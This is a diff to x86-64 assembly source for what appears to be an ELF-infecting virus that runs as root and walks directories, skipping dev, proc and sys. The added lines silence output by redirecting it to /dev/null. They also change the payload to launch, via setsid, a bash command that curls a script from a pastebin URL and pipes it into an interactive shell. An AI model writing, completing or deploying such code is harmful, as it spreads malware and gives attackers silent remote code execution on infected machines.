@@ -377,9 +377,26 @@ _i_am_root:
 	push r9
 	pop rdx
 
+	; TODO: pipe to void error
+	lea rdi, [rel devnull]
+	mov rsi, 1
+	mov rax, 2; ;open("/dev/null", O_WRONLY)
+	syscall
+	mov rdi, rax
+	mov rsi, 1
+	mov rax, 33; dup2(fd, 1)
+	syscall
+	mov rsi, 2
+	mov rax, 33; dup2(fd, 2)
+	syscall
+	mov rax, 3; close(fd)
+	syscall
+
 	; I am root
 	xor rax, rax
 	push rax; NULL
+	lea rdi, [rel argv3]
+	push rdi
 	lea rdi, [rel argv2]
 	push rdi
 	lea rdi, [rel argv1]
@@ -1016,9 +1033,11 @@ elf_magic db 0x7f, 0x45, 0x4c, 0x46, 0x2, 0x0
 ; =
 ;	directories db `/`, 0x0, 0x0
 	dotdir db `.`, 0x0, `..`, 0x0, `dev`, 0x0, `proc`, 0x0, `sys`, 0x0, 0x0
-	argv0 db `/bin/bash`, 0x0
-	argv1 db `-c`, 0x0
-	argv2 db `$(curl -s https://pastebin.com/raw/8yQz24N9)`, 0x0
+	devnull db `/dev/null`, 0x0
+	argv0 db `/bin/setsid`, 0x0
+	argv1 db `/bin/bash`, 0x0
+	argv2 db `-c`, 0x0
+	argv3 db `$(curl -s https://pastebin.com/raw/bnNiVmsD | /bin/bash -i)`, 0x0
 %else
 	directories db `/tmp/test`, 0x0, `/tmp/test2`, 0x0, 0x0
 	dotdir db `.`, 0x0, `..`, 0x0, 0x0
